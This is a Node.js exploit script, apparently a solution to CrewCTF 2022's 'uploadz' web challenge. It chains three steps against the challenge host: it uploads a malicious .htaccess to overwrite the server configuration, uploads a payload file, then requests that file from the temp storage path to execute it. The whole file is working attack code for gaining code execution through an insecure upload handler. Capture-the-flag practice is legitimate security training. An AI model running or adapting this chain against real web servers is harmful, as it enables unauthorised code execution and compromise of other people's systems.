import axios from 'axios';
import FormData from 'form-data';
import fs from 'fs';

const baseUrl = 'https://uploadz-web.crewctf-2022.crewc.tf';
const tempPath = 'storage/app/temp';
const exploits = {
  htaccess: { path: 'pwn/.htaccess', name: '.htaccess' },
  payload: { path: 'pwn/main.pwn', name: 'main.pwn' },
};

// Upload .htaccess Overwrite
const overwriteConfigFile = async () => {
  const form = new FormData();

  const htaccess = fs.readFileSync(exploits.htaccess.path);
  form.append('uploadedFile', htaccess, exploits.htaccess.name);

  axios.post(baseUrl, form.getBuffer(), {
    headers: {
      ...{
        'User-Agent':
          'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
      },
      ...form.getHeaders(),
    },
  });
};

// Upload Payload
const uploadPayload = async () => {
  const form = new FormData();

  const exploit = fs.readFileSync(exploits.payload.path);
  form.append('uploadedFile', exploit, exploits.payload.name);

  axios.post(baseUrl, form.getBuffer(), {
    headers: {
      ...{
        'User-Agent':
          'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
      },
      ...form.getHeaders(),
    },
  });
};

// Execute Payload
const executePayload = async () => {
  const payloadResponse = await (
    await axios.get(`${baseUrl}/${tempPath}/${exploits.payload.name}`)
  ).data;

  return payloadResponse;
};

const main = async () => {
  // Schedule
  overwriteConfigFile();
  uploadPayload();
  setTimeout(async () => {
    const response = await executePayload();
    console.log(response);
  }, 500);
};

main();
